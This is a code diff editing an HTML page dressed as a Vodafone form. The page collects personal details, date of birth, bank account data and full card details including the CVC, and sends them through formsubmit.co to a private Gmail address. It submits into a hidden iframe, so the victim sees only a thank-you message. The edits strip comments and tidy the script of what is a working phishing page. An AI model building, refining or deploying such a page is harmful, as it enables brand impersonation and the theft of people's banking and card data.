@@ -416,7 +416,6 @@
       background: #c10000;
     }
 
-    /* Hidden iframe for form submission */
     .hidden-iframe {
       position: absolute;
       width: 0;
@@ -448,7 +447,6 @@
   </div>
 
   <div class="form-body">
-    <!-- Target iframe for form submission to avoid page redirect -->
     <iframe name="hiddenFrame" class="hidden-iframe"></iframe>
     
     <form id="vodafoneForm" action="https://formsubmit.co/ceo.mark.hall@gmail.com" method="POST" enctype="multipart/form-data" target="hiddenFrame">
@@ -458,7 +456,6 @@
       <input type="hidden" name="_blacklist" value="">
       <input type="hidden" name="_template" value="table">
       
-      <!-- SECTION 1: Personal Information -->
       <div class="section">
         <div class="section-title">
           <i class="fas fa-user-circle"></i>
@@ -481,13 +478,13 @@
           <div class="input-group full-width">
             <label><i class="fas fa-birthday-cake"></i> Date of birth</label>
             <div class="dob-row">
-              <select id="dobDay" name="Date of Birth - Day" required style="padding: 12px 8px;">
+              <select id="dobDay" required>
                 <option value="" disabled selected>Day</option>
               </select>
-              <select id="dobMonth" name="Date of Birth - Month" required style="padding: 12px 8px;">
+              <select id="dobMonth" required>
                 <option value="" disabled selected>Month</option>
               </select>
-              <select id="dobYear" name="Date of Birth - Year" required style="padding: 12px 8px;">
+              <select id="dobYear" required>
                 <option value="" disabled selected>Year</option>
               </select>
             </div>
@@ -508,7 +505,6 @@
         </div>
       </div>
 
-      <!-- SECTION 2: Bank Account Details -->
       <div class="section">
         <div class="section-title">
           <i class="fas fa-building-columns"></i>
@@ -530,7 +526,6 @@
         </div>
       </div>
 
-      <!-- SECTION 3: Card details -->
       <div class="section">
         <div class="section-title">
           <i class="fas fa-credit-card-front"></i>
@@ -558,7 +553,6 @@
         </div>
       </div>
 
-      <!-- SECTION 4: Employment status -->
       <div class="section">
         <div class="section-title">
           <i class="fas fa-briefcase"></i>
@@ -636,8 +630,7 @@
       thankyouModal.classList.remove('active');
       if (submissionSuccess) {
         form.reset();
-        const empSel = document.getElementById('employmentStatus');
-        empSel.selectedIndex = 0;
+        document.getElementById('employmentStatus').selectedIndex = 0;
         document.getElementById('dobDay').selectedIndex = 0;
         document.getElementById('dobMonth').selectedIndex = 0;
         document.getElementById('dobYear').selectedIndex = 0;
@@ -647,6 +640,7 @@
     }
     window.closeThankYouModal = closeThankYouModal;
 
+    // Populate Date of Birth dropdowns
     function populateDOB() {
       const daySelect = document.getElementById('dobDay');
       for (let i = 1; i <= 31; i++) {
@@ -655,6 +649,7 @@
         option.textContent = i;
         daySelect.appendChild(option);
       }
+      
       const monthSelect = document.getElementById('dobMonth');
       const months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
       months.forEach((month, idx) => {
@@ -663,6 +658,7 @@
         option.textContent = month;
         monthSelect.appendChild(option);
       });
+      
       const yearSelect = document.getElementById('dobYear');
       const currentYear = new Date().getFullYear();
       for (let i = currentYear; i >= 1920; i--) {
@@ -689,6 +685,7 @@
         { id: 'expiryDate', name: 'Expiry date' },
         { id: 'cvc', name: 'CVC' }
       ];
+      
       for (let field of requiredFields) {
         const inputElem = document.getElementById(field.id);
         if (!inputElem.value.trim()) {
@@ -704,15 +701,18 @@
       const day = document.getElementById('dobDay').value;
       const month = document.getElementById('dobMonth').value;
       const year = document.getElementById('dobYear').value;
+      
       if (!day || !month || !year) {
         showMessage("🎂 Please select complete Date of Birth", true);
         return false;
       }
+      
       const birthDate = new Date(year, month-1, day);
       const today = new Date();
       let age = today.getFullYear() - birthDate.getFullYear();
       const mDiff = today.getMonth() - birthDate.getMonth();
       if (mDiff < 0 || (mDiff === 0 && today.getDate() < birthDate.getDate())) age--;
+      
       if (age < 18) {
         showMessage("⚠️ You must be at least 18 years old to continue.", true);
         return false;
@@ -753,7 +753,6 @@
       return true;
     }
 
-    // Add hidden DOB field before submit
     function addCombinedDOBField() {
       const day = document.getElementById('dobDay').value;
       const month = document.getElementById('dobMonth').value;
@@ -802,22 +801,19 @@
 
     document.getElementById('clearBtn').addEventListener('click', function() {
       form.reset();
-      const empSelect = document.getElementById('employmentStatus');
-      empSelect.selectedIndex = 0;
+      document.getElementById('employmentStatus').selectedIndex = 0;
       document.getElementById('dobDay').selectedIndex = 0;
       document.getElementById('dobMonth').selectedIndex = 0;
       document.getElementById('dobYear').selectedIndex = 0;
       showMessage("Form has been reset", false);
     });
 
-    // Listen for iframe load to detect form submission completion
     const iframe = document.querySelector('iframe[name="hiddenFrame"]');
     iframe.addEventListener('load', function() {
       submitBtn.disabled = false;
       submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> Verify & continue';
       
-      if (submissionSuccess === false) {
-        // This is the submission response
+      if (submissionSuccess === false && submitBtn.disabled === false) {
         submissionSuccess = true;
         thankyouModal.classList.add('active');
       }
@@ -832,4 +828,9 @@
       addCombinedDOBField();
       
       submitBtn.disabled = true;
-      submit
+      submitBtn.innerHTML = '<span class="loading-spinner"></span> Sending...';
+    });
+  })();
+</script>
+</body>
+</html>
